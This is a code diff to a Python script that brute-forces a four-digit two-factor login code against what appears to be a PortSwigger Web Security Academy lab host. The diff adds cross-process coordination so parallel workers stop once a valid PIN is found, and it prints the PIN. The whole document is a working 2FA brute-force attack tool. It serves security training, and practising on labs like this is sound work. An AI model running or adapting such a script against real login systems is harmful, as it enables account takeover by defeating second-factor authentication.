@@ -9,8 +9,9 @@ if 'https://' in site:
     site = site.rstrip('/').lstrip('https://')
 """
 # For me only
-site = 'ace11ff21f0a2524800b768400250032.web-security-academy.net'
+site = 'ac741fc81e815a2f8060849b00e0009a.web-security-academy.net'
 s = requests.Session()
+answer = multiprocessing.Value('i', -1)
 
 
 # Credit to https://stackoverflow.com/questions/14822184/is-there-a-ceiling-equivalent-of-operator-in-python
@@ -28,11 +29,8 @@ def try_code(csrf, code):
     }
     resp = s.post(login2_url, data=login2data, allow_redirects=False)
     if resp.status_code == 302:
-        print(f'2fa valid with response code {resp.status_code} using {login2data["mfa-code"]}')
-        # Visit account profile page to complete level
-    else:
-        print(".", end='')
-        # print(f'2fa invalid with response code: {resp.status_code} using {login2data["mfa-code"]}')
+        with answer.get_lock():
+            answer.value = int(login2data["mfa-code"])
     return resp.status_code
 
 
@@ -60,6 +58,8 @@ def dispatch_requests(range_arg):
     high = range_arg[1]
     iterations = ceildiv(high - low + 1, 2)
     for x in range(iterations):
+        if answer.value >= 0:
+            return
         csrf = get_csrf()
         if try_code(csrf, x) == 302:
             break
@@ -74,7 +74,11 @@ def dispatch_requests(range_arg):
 
 
 if __name__ == '__main__':
-    processing = [[0, 2500], [2501, 5000], [5001, 7500], [7501, 9999]]
-    p = multiprocessing.Pool(4)
+    processing = [[0, 2500], [2501, 5000], [5001, 7500], [7501, 9999]]  # This list is geared for 4 cpus
+    p = multiprocessing.Pool(multiprocessing.cpu_count())
     p.map(dispatch_requests, processing)
     p.close()
+    if answer.value >= 0:
+        print(f"PIN: {answer.value}")
+    else:
+        print("PIN not found.")
